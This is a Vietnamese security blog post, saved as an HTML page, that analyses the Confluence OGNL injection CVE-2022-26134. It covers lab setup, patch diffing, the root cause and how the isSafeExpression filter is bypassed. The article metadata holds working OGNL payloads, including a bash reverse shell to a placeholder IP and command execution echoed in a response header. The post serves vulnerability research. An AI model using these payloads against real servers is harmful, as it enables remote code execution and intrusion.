<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134 | blog.undo.pw</title><meta name=keywords content="cve,atlassian,confluence,ognl"><meta name=description content="Brief analysis of CVE-2022-26134"><meta name=author content="son"><link rel=canonical href=https://blog.undo.pw/posts/cve-2022-26134-confluence-ognl-injection/><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.undo.pw/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.undo.pw/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.undo.pw/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.undo.pw/apple-touch-icon.png><link rel=mask-icon href=https://blog.undo.pw/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134"><meta property="og:description" content="Brief analysis of CVE-2022-26134"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.undo.pw/posts/cve-2022-26134-confluence-ognl-injection/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-06-17T00:00:00+00:00"><meta property="article:modified_time" content="2022-06-17T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134"><meta name=twitter:description content="Brief analysis of CVE-2022-26134"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.undo.pw/posts/"},{"@type":"ListItem","position":2,"name":"Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134","item":"https://blog.undo.pw/posts/cve-2022-26134-confluence-ognl-injection/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134","name":"Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134","description":"Brief analysis of CVE-2022-26134","keywords":["cve","atlassian","confluence","ognl"],"articleBody":"List of vuln references CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134 Advisory: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html Setup Khởi tạo Confluence với file docker-compose.yml có nội dung như sau:\nversion: \"3.9\" services: conf: image: atlassian/confluence-server:7.18.0 container_name: confluence-server depends_on: - db ports: - 8090:8090 - 8091:8091 - 5005:5005 environment: ATL_JDBC_URL: jdbc:postgresql://db:5432/confluence ATL_JDBC_USER: postgres ATL_JDBC_PASSWORD: postgres ATL_DB_TYPE: postgresql ATL_DB_DRIVER: org.postgresql.Driver ATL_DB_SCHEMA_NAME: confluence JVM_SUPPORT_RECOMMENDED_ARGS: -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 ATL_LICENSE_KEY: [REDACTED] db: image: postgres restart: always container_name: confluence-database environment: POSTGRES_PASSWORD: postgres POSTGRES_DB: confluence Thêm thắt một chút cho việc debug từ file Yaml có sẵn tại: https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/confluence-cve-2022-26134/docker-compose.yml\nHow to diff Sử dụng công cụ diff có sẵn của IntelliJ IDEA:\nidea diff [folder1] [folder2] Theo advisory, bản patch được áp dụng tại file xwork-1.0.3-atlassian-10.jar thay thế cho file cũ xwork-1.0.3-atlassian-8.jar.\nSau khi load vào công cụ diff, tiến hành chọn cả 2 files, nhấn chuột phải và chọn Compare New Files with Each Other.\nRoot cause Trong method ActionChainResult.execute() thực hiện method TextParseUtil.translateVariables() với tham số lần lượt là 2 parameters namespace và actionName.\nMethod TextParseUtil.translateVariables() được định nghĩa như sau:\n// com/opensymphony/xwork/util/TextParseUtil.class public static String translateVariables(String expression, OgnlValueStack stack) { StringBuilder sb = new StringBuilder(); Pattern p = Pattern.compile(\"\\\\$\\\\{([^}]*)\\\\}\"); Matcher m = p.matcher(expression); int previous; for (previous = 0; m.find(); previous = m.end()) { String g = m.group(1); int start = m.start(); String value; try { Object o = stack.findValue(g); value = o == null ? \"\" : o.toString(); } catch (Exception var10) { value = \"\"; } sb.append(expression.substring(previous, start)).append(value); } if (previous \u003c expression.length()) { sb.append(expression.substring(previous)); } return sb.toString(); } Method này thực hiện việc tìm trong tham số expression giá trị nào thỏa mãn với regex \\\\$\\\\{([^}]*)\\\\} thì sẽ áp dụng phương thức OgnlValueStack.findValue() để execute OGNL.\nQuay lại với các tham số được truyền vào TextParseUtil.translateVariables(), giá trị của namespace được lấy từ ServletDispatcher.getNameSpace().\n// com/opensymphony/webwork/dispatcher/ServletDispatcher.class protected String getNameSpace(HttpServletRequest request) { String servletPath = request.getServletPath(); return getNamespaceFromServletPath(servletPath); } Method getNamespaceFromServletPath() được gọi với tham số là servletPath.\n// com/opensymphony/webwork/dispatcher/ServletDispatcher.class public static String getNamespaceFromServletPath(String servletPath) { servletPath = servletPath.substring(0, servletPath.lastIndexOf(\"/\")); return servletPath; } Method này sẽ trả về giá trị của servletPath từ vị trí đầu tiên tới vị trí của kí tự / cuối cùng.\n=\u003e Như vậy để OGNL expression của ta được thực hiện thì kí tự / phải được đặt vào cuối servlet path.\nBypass isSafeExpression() check Đây là cơ chế được thêm vào Confluence sau phiên bản 7.16 nhằm ngăn chặn các OGNL expression độc hại. Cốt lõi của method isSafeExpression() là sử dụng method isSafeExpressionInternal() nên ta chỉ tập trung vào phân tích hàm này.\n// com/opensymphony/xwork/util/SafeExpressionUtil.class private boolean isSafeExpressionInternal(String expression, Set\u003cString\u003e visitedExpressions) { if (!this.SAFE_EXPRESSIONS_CACHE.contains(expression)) { if (this.UNSAFE_EXPRESSIONS_CACHE.contains(expression)) { return false; } if (this.isUnSafeClass(expression)) { this.UNSAFE_EXPRESSIONS_CACHE.add(expression); return false; } if (SourceVersion.isName(this.trimQuotes(expression)) \u0026\u0026 this.allowedClassNames.contains(this.trimQuotes(expression))) { this.SAFE_EXPRESSIONS_CACHE.add(expression); } else { try { Object parsedExpression = OgnlUtil.compile(expression); if (parsedExpression instanceof Node) { if (this.containsUnsafeExpression((Node)parsedExpression, visitedExpressions)) { this.UNSAFE_EXPRESSIONS_CACHE.add(expression); log.debug(String.format(\"Unsafe clause found in [\\\" %s \\\"]\", expression)); } else { this.SAFE_EXPRESSIONS_CACHE.add(expression); } } } catch (RuntimeException | OgnlException var4) { this.SAFE_EXPRESSIONS_CACHE.add(expression); log.debug(\"Cannot verify safety of OGNL expression\", var4); } } } return this.SAFE_EXPRESSIONS_CACHE.contains(expression); } Lần đầu dừng tại hàm này, OGNL expression của ta sẽ được đưa vào method OgnlUtil.compile() để parse, sau đó đưa vào method this.containsUnsafeExpression() để xử lí.\n// com/opensymphony/xwork/util/SafeExpressionUtil.class private boolean containsUnsafeExpression(Node node, Set\u003cString\u003e visitedExpressions) { String nodeClassName = node.getClass().getName(); if (UNSAFE_NODE_TYPES.contains(nodeClassName)) { return true; } else if (\"ognl.ASTStaticMethod\".equals(nodeClassName) \u0026\u0026 !this.allowedClassNames.contains(getClassNameFromStaticMethod(node))) { return true; } else if (\"ognl.ASTProperty\".equals(nodeClassName) \u0026\u0026 this.isUnSafeClass(node.toString())) { return true; } else if (\"ognl.ASTMethod\".equals(nodeClassName) \u0026\u0026 this.unsafeMethodNames.contains(getMethodInOgnlExp(node))) { return true; } else if (\"ognl.ASTVarRef\".equals(nodeClassName) \u0026\u0026 UNSAFE_VARIABLE_NAMES.contains(node.toString())) { return true; } else if (\"ognl.ASTConst\".equals(nodeClassName) \u0026\u0026 !this.isSafeConstantExpressionNode(node, visitedExpressions)) { return true; } else { for(int i = 0; i \u003c node.jjtGetNumChildren(); ++i) { Node childNode = node.jjtGetChild(i); if (childNode != null \u0026\u0026 this.containsUnsafeExpression(childNode, visitedExpressions)) { return true; } } return false; } } Method này hoạt động bằng cách parse OGNL expression thành các AST node rồi lặp qua từng node để kiểm tra. Những yếu tố mà thư viện XWork dựa vào để xác định expression an toàn hay không:\nNode type Class name Method name Variable name Cụ thể các node, class, method và variable được xem là unsafe:\nvà các class name được xem là safe tại property allowedClassNames:\nMethod this.isUnsafeClass() có nhiệm vụ kiểm tra class name được sử dụng trong expression có nằm trong property unsafePropertyNames hay không.\nPayload testing Đầu tiên, chúng ta xét payload đơn giản sau:\n${@java.lang.Runtime@getRuntime().exec(\"touch /tmp/pwned\")} Expression hiện tại của ta có dạng ognl.ASTChain.\nSau đó lấy child node và tiếp tục parse.\nHiện tại nodeClassName có giá trị ognl.ASTStaticMethod và không nằm trong allowedClassNames nên sẽ trả về true. Đồng nghĩa với việc payload của ta đã được xem là unsafe và sẽ không thực hiện payload nữa.\nBypass ways Unicode escape Sử dụng các kí tự được unicode escaped (\\u0041 =\u003e a). Kĩ thuật này được anh Jang viết tại đây.\nVề cơ bản, trong quá trình xử lí OGNL, method OgnlParserTokenManager.getNextToken() sử dụng method JavaCharStream.readChar() có hỗ trợ xử lí chuỗi unicode escape nên chúng ta có thể lợi dụng điều này để vượt qua được bộ lọc.\nNối chuỗi Ý tưởng được lấy từ blog của anh @mr_r3bot.\n${Class.forName(\"java.lang.\"+\"Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"touch /tmp/pwned\")}} Những thứ mà payload này sử dụng để vượt qua được các constraints:\nSử dụng trực tiếp class Class thay vì các cách như: java.lang.Class, ''.class, ''.getClass(). Tạo thành 2 chuỗi con và sử dụng nối chuỗi để ghép thành java.lang.Runtime ở giai đoạn runtime nhằm bypass method this.isUnSafeClass() trong đoạn xử lí đối với ognl.ASTConst vốn nằm ở giai đoạn pre-processing. Chúng ta có nhiều cách để đa dạng hóa payload ở bước này vì payload được thực hiện ở giai đoạn runtime. Tham khảo thêm tại đây.\nVì sử dụng kĩ thuật Reflection để truy cập vào các method trong class Runtime, cộng với việc 2 method là getMethod và invoke không bị chặn nên ta có thể call được method Runtime.exec(). Sử dụng các class có sẵn và không bị blacklist Payload này được lấy từ repo jbaines-r7/through_the_wire. Thông tin rằng đây là payload ban đầu mà nhóm APT-31 đã thực hiện tấn công khiến cho lỗ hổng 0-day của Confluence lúc này bị phát hiện và được biết đến rộng rãi như hiện tại.\n${Class.forName(\"com.opensymphony.webwork.ServletActionContext\").getMethod(\"getResponse\",null).invoke(null,null).setHeader(\"\", Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"nashorn\").eval(\"new java.lang.ProcessBuilder().command('bash','-c','bash -i \u003e\u0026 /dev/tcp/IP/PORT 0\u003e\u00261').start()\"))} Payload này có nhiệm vụ chính là khởi tạo 1 nashorn instance (Javascript engine được tích hợp vào Java) và gọi đến ProcessBuilder.command() nhằm mục đích chạy payload để reverse shell.\nChúng ta có thể viết lại để payload này trả về kết quả tại giá trị trong header response như sau:\n${Class.forName(\"com.opensymphony.webwork.ServletActionContext\").getMethod(\"getResponse\",null).invoke(null,null).setHeader(\"Result\",Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"nashorn\").eval(\"res='';is=java.lang.Runtime.getRuntime().exec('id').getInputStream();while(is.available())res+=String.fromCharCode(is.read());res\"))} ","wordCount":"1095","inLanguage":"en","datePublished":"2022-06-17T00:00:00Z","dateModified":"2022-06-17T00:00:00Z","author":{"@type":"Person","name":"son"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.undo.pw/posts/cve-2022-26134-confluence-ognl-injection/"},"publisher":{"@type":"Organization","name":"blog.undo.pw","logo":{"@type":"ImageObject","url":"https://blog.undo.pw/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.undo.pw/ accesskey=h title="blog.undo.pw (Alt + H)">blog.undo.pw</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.undo.pw/archives title=archives><span>archives</span></a></li><li><a href=https://blog.undo.pw/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://blog.undo.pw/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.undo.pw/>Home</a>&nbsp;»&nbsp;<a href=https://blog.undo.pw/posts/>Posts</a></div><h1 class=post-title>Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134</h1><div class=post-meta><span title='2022-06-17 00:00:00 +0000 UTC'>June 17, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;son&nbsp;|&nbsp;<a href=https://github.com/qnhn/qnhn.github.io/tree/main/content/posts/cve-2022-26134-confluence-ognl-injection.md rel="noopener noreferrer" target=_blank>suggest changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#list-of-vuln-references>List of vuln references</a></li><li><a href=#setup>Setup</a></li><li><a href=#how-to-diff>How to diff</a></li><li><a href=#root-cause>Root cause</a></li><li><a href=#bypass-issafeexpression-check>Bypass <code>isSafeExpression()</code> check</a><ul><li><a href=#payload-testing>Payload testing</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=list-of-vuln-references>List of vuln references<a hidden class=anchor aria-hidden=true href=#list-of-vuln-references>#</a></h2><ul><li>CVE: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134</a></li><li>Advisory: <a href=https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html>https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html</a></li></ul><h2 id=setup>Setup<a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>Khởi tạo Confluence với file <code>docker-compose.yml</code> có nội dung như sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#34;3.9&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>services</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>conf</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>image</span>: <span style=color:#ae81ff>atlassian/confluence-server:7.18.0</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>container_name</span>: <span style=color:#ae81ff>confluence-server</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>depends_on</span>:
</span></span><span style=display:flex><span>      - <span style=color:#ae81ff>db</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>ports</span>:
</span></span><span style=display:flex><span>       - <span style=color:#ae81ff>8090</span>:<span style=color:#ae81ff>8090</span>
</span></span><span style=display:flex><span>       - <span style=color:#ae81ff>8091</span>:<span style=color:#ae81ff>8091</span>
</span></span><span style=display:flex><span>       - <span style=color:#ae81ff>5005</span>:<span style=color:#ae81ff>5005</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>environment</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>ATL_JDBC_URL</span>: <span style=color:#ae81ff>jdbc:postgresql://db:5432/confluence</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>ATL_JDBC_USER</span>: <span style=color:#ae81ff>postgres</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>ATL_JDBC_PASSWORD</span>: <span style=color:#ae81ff>postgres</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>ATL_DB_TYPE</span>: <span style=color:#ae81ff>postgresql</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>ATL_DB_DRIVER</span>: <span style=color:#ae81ff>org.postgresql.Driver</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>ATL_DB_SCHEMA_NAME</span>: <span style=color:#ae81ff>confluence</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>JVM_SUPPORT_RECOMMENDED_ARGS</span>: -<span style=color:#ae81ff>agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>ATL_LICENSE_KEY</span>:
</span></span><span style=display:flex><span>        [<span style=color:#ae81ff>REDACTED]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>db</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>image</span>: <span style=color:#ae81ff>postgres</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>restart</span>: <span style=color:#ae81ff>always</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>container_name</span>: <span style=color:#ae81ff>confluence-database</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>environment</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>POSTGRES_PASSWORD</span>: <span style=color:#ae81ff>postgres</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>POSTGRES_DB</span>: <span style=color:#ae81ff>confluence</span>
</span></span></code></pre></div><p>Thêm thắt một chút cho việc debug từ file Yaml có sẵn tại: <a href=https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/confluence-cve-2022-26134/docker-compose.yml>https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/confluence-cve-2022-26134/docker-compose.yml</a></p><h2 id=how-to-diff>How to diff<a hidden class=anchor aria-hidden=true href=#how-to-diff>#</a></h2><p>Sử dụng công cụ diff có sẵn của IntelliJ IDEA:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>idea diff [folder1] [folder2]
</span></span></code></pre></div><p>Theo advisory, bản patch được áp dụng tại file <code>xwork-1.0.3-atlassian-10.jar</code> thay thế cho file cũ <code>xwork-1.0.3-atlassian-8.jar</code>.</p><p><img loading=lazy src=https://i.imgur.com/PgpBY36.png alt></p><p>Sau khi load vào công cụ diff, tiến hành chọn cả 2 files, nhấn chuột phải và chọn <code>Compare New Files with Each Other</code>.</p><p><img loading=lazy src=https://i.imgur.com/yZTiSyJ.png alt></p><h2 id=root-cause>Root cause<a hidden class=anchor aria-hidden=true href=#root-cause>#</a></h2><p>Trong method <code>ActionChainResult.execute()</code> thực hiện method <code>TextParseUtil.translateVariables()</code> với tham số lần lượt là 2 parameters <code>namespace</code> và <code>actionName</code>.</p><p><img loading=lazy src=https://i.imgur.com/GYZPrJi.png alt></p><p>Method <code>TextParseUtil.translateVariables()</code> được định nghĩa như sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// com/opensymphony/xwork/util/TextParseUtil.class
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>translateVariables</span><span style=color:#f92672>(</span>String expression<span style=color:#f92672>,</span> OgnlValueStack stack<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    StringBuilder sb <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> StringBuilder<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    Pattern p <span style=color:#f92672>=</span> Pattern<span style=color:#f92672>.</span><span style=color:#a6e22e>compile</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\$\\{([^}]*)\\}&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    Matcher m <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span><span style=color:#a6e22e>matcher</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> previous<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>previous <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> m<span style=color:#f92672>.</span><span style=color:#a6e22e>find</span><span style=color:#f92672>();</span> previous <span style=color:#f92672>=</span> m<span style=color:#f92672>.</span><span style=color:#a6e22e>end</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String g <span style=color:#f92672>=</span> m<span style=color:#f92672>.</span><span style=color:#a6e22e>group</span><span style=color:#f92672>(</span>1<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> start <span style=color:#f92672>=</span> m<span style=color:#f92672>.</span><span style=color:#a6e22e>start</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        String value<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Object o <span style=color:#f92672>=</span> stack<span style=color:#f92672>.</span><span style=color:#a6e22e>findValue</span><span style=color:#f92672>(</span>g<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            value <span style=color:#f92672>=</span> o <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>:</span> o<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception var10<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sb<span style=color:#f92672>.</span><span style=color:#a6e22e>append</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>.</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span>previous<span style=color:#f92672>,</span> start<span style=color:#f92672>)).</span><span style=color:#a6e22e>append</span><span style=color:#f92672>(</span>value<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>previous <span style=color:#f92672>&lt;</span> expression<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        sb<span style=color:#f92672>.</span><span style=color:#a6e22e>append</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>.</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span>previous<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> sb<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Method này thực hiện việc tìm trong tham số <code>expression</code> giá trị nào thỏa mãn với regex <code>\\$\\{([^}]*)\\}</code> thì sẽ áp dụng phương thức <code>OgnlValueStack.findValue()</code> để execute OGNL.</p><p><img loading=lazy src=https://i.imgur.com/6kMhsHC.png alt></p><p>Quay lại với các tham số được truyền vào <code>TextParseUtil.translateVariables()</code>, giá trị của <code>namespace</code> được lấy từ <code>ServletDispatcher.getNameSpace()</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// com/opensymphony/webwork/dispatcher/ServletDispatcher.class
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>protected</span> String <span style=color:#a6e22e>getNameSpace</span><span style=color:#f92672>(</span>HttpServletRequest request<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    String servletPath <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletPath</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> getNamespaceFromServletPath<span style=color:#f92672>(</span>servletPath<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Method <code>getNamespaceFromServletPath()</code> được gọi với tham số là <code>servletPath</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// com/opensymphony/webwork/dispatcher/ServletDispatcher.class
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>getNamespaceFromServletPath</span><span style=color:#f92672>(</span>String servletPath<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    servletPath <span style=color:#f92672>=</span> servletPath<span style=color:#f92672>.</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span>0<span style=color:#f92672>,</span> servletPath<span style=color:#f92672>.</span><span style=color:#a6e22e>lastIndexOf</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> servletPath<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Method này sẽ trả về giá trị của <code>servletPath</code> từ vị trí đầu tiên tới vị trí của kí tự <code>/</code> cuối cùng.</p><p>=> Như vậy để OGNL expression của ta được thực hiện thì kí tự <code>/</code> phải được đặt vào cuối servlet path.</p><h2 id=bypass-issafeexpression-check>Bypass <code>isSafeExpression()</code> check<a hidden class=anchor aria-hidden=true href=#bypass-issafeexpression-check>#</a></h2><p>Đây là cơ chế được thêm vào Confluence sau phiên bản 7.16 nhằm ngăn chặn các OGNL expression độc hại. Cốt lõi của method <code>isSafeExpression()</code> là sử dụng method <code>isSafeExpressionInternal()</code> nên ta chỉ tập trung vào phân tích hàm này.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// com/opensymphony/xwork/util/SafeExpressionUtil.class
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>isSafeExpressionInternal</span><span style=color:#f92672>(</span>String expression<span style=color:#f92672>,</span> Set<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> visitedExpressions<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>UNSAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
